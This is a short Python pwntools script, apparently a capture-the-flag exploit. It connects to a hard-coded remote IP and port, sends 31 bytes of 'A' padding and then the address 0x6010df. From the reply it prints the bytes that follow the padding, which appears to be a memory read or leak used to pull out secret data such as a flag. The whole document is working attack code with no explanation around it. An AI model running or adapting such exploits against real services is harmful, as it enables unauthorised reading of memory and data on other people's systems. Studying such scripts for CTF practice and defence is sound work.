#!/usr/bin/env python
from pwn import *
p = remote('47.103.214.163', 20002)
print p.recv()
p.send('A'*31 + '\n')
print p.recv()
p.send(str(0x6010df)+'\n')
r = p.recv()
#print(repr(r))
print r.split('A'*31)[-1]
#p.interactive()
p.close()
exit(0)